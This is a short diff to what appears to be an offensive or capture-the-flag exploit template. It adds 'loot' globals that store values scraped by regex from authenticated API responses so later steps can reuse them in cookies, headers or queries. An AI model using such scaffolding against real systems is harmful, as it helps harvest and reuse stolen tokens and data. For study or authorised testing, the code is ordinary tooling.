@@ -399,6 +399,13 @@ def callback_url(path="", scheme="http"):
     # - EXTRACT_REGEX: capture candidates from the body.
     # - HIT_CONTAINS_*: filters applied to each captured candidate.
     # - FIELD_REGEX: optional key=value parser for each final hit.
+    # Output globals for later steps:
+    # - LOOT_HITS: all final hits.
+    # - LOOT_HIT: selected hit, usable in cookies/headers/query/websocket.
+    # - LOOT_FIELDS: parsed key=value fields from LOOT_HIT, if FIELD_REGEX matches.
+    global LOOT_HITS, LOOT_HIT, LOOT_FIELDS
+    LOOT_HITS, LOOT_HIT, LOOT_FIELDS = [], None, {}
+
     PATH = "/api/items"                       # EDIT endpoint to fetch, e.g. /group/13/messages
     PARAMS = {}                               # EDIT query params, e.g. {"page": "1"}
     HEADERS = {}                              # EDIT extra headers only; Bearer from login is already in s.headers
@@ -500,6 +507,13 @@ def callback_url(path="", scheme="http"):
             print(f"[debug] USE_LAST_HIT=True, keeping hit {len(hits)} only")
         hits = [hits[-1]]
 
+    LOOT_HITS = hits
+    LOOT_HIT = hits[0] if hits else None
+    if FIELD_REGEX and LOOT_HIT:
+        LOOT_FIELDS = dict(re.findall(FIELD_REGEX, LOOT_HIT))
+    else:
+        LOOT_FIELDS = {}
+
     print("[+] conditional GET matched")
     for hit in hits:
         print("[hit]", hit)
@@ -509,6 +523,9 @@ def callback_url(path="", scheme="http"):
             fields = dict(re.findall(FIELD_REGEX, hit))
             if fields:
                 print("[fields]", fields)
+    if DEBUG_CAPTURE:
+        print("[loot] LOOT_HIT =", LOOT_HIT)
+        print("[loot] LOOT_FIELDS =", LOOT_FIELDS)
     return hits
 `
   },
